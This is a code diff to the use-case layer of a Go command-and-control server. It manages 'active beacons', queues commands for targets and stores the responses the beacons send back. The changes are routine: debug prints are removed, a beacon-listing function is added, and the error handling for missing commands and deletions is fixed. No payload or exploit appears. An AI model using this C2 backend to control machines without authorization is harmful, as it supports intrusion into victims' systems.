@@ -2,7 +2,6 @@ package abusecase
 
 import (
 	"context"
-	"fmt"
 	"github.com/mojodojo101/c2server/pkg/activebeacon"
 	"github.com/mojodojo101/c2server/pkg/models"
 	"github.com/mojodojo101/c2server/pkg/target"
@@ -53,41 +52,58 @@ func (au *activebeaconUsecase) GetTargetByIpv4(ctx context.Context, host string)
 	return t, err
 
 }
+
+//When a beacon comes back with a command response this will set the command as executed and save the response in the
+//internal_resources/target/<tid>/<cmdid>
 func (au *activebeaconUsecase) SetCmdExecuted(ctx context.Context, a *models.ActiveBeacon, response []byte) error {
 	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
 	defer cancel()
 
 	t, err := au.targetUsecase.GetByID(cctx, a.TId)
-	fmt.Printf("\na.Cmdid1=%v,\n t1 =%#v\n", a.CmdId, t)
 
 	if err != nil {
 
 		return err
 	}
 	err = au.targetUsecase.SetCmdExecuted(cctx, t, a.CmdId, response)
-	fmt.Printf("\na.Cmdid2=%v,\n t2 =%#v\n", a.CmdId, t)
 	return err
 
 }
+
+func (au *activebeaconUsecase) ListActiveBeacons(ctx context.Context, amount int64) ([]models.ActiveBeacon, error) {
+
+	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
+	defer cancel()
+
+	abs, err := au.activebeaconRepo.GetAllActiveBeacons(cctx, amount)
+	return abs, err
+
+}
+
+//Gets the next command and ping duration for a beacon
 func (au *activebeaconUsecase) GetNextCmd(ctx context.Context, a *models.ActiveBeacon) error {
 
 	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
 	defer cancel()
 	t, err := au.targetUsecase.GetByID(cctx, a.TId)
+
 	if err != nil {
 		return err
 	}
 	cmd, err := au.targetUsecase.GetNextCmd(cctx, t)
-	if err != nil {
-		return err
+
+	a.Cmd = ""
+	if err == nil {
+		a.Cmd = cmd.Cmd
+		a.CmdId = cmd.Id
 	}
-	a.Cmd = cmd.Cmd
-	a.CmdId = cmd.Id
 	a.UpdatedAt = time.Now()
 	err = au.Update(cctx, a)
 	return err
 
 }
+
+//Creates a new active beacon
 func (au *activebeaconUsecase) Register(ctx context.Context, a *models.ActiveBeacon) error {
 	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
 	defer cancel()
@@ -104,21 +120,23 @@ func (au *activebeaconUsecase) Delete(ctx context.Context, a *models.ActiveBeaco
 	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
 	defer cancel()
 	existingBeacon, _ := au.GetByID(cctx, a.Id)
-	if existingBeacon != nil {
-		return models.ErrDuplicate
+	if existingBeacon == nil {
+		return models.ErrItemNotFound
 	}
 	err := au.activebeaconRepo.DeleteByID(cctx, a.Id)
+
 	return err
 
 }
-func (au *activebeaconUsecase) Update(ctx context.Context, a *models.ActiveBeacon) error {
+func (au *activebeaconUsecase) Update(ctx context.Context, ab *models.ActiveBeacon) error {
 	cctx, cancel := context.WithTimeout(ctx, au.contextTimeout)
 	defer cancel()
-	_, err := au.GetByID(cctx, a.Id)
+	_, err := au.GetByID(cctx, ab.Id)
 	if err != nil {
 		return models.ErrItemNotFound
 	}
-	err = au.activebeaconRepo.Update(cctx, a)
+	err = au.activebeaconRepo.Update(cctx, ab)
+
 	return err
 
 }
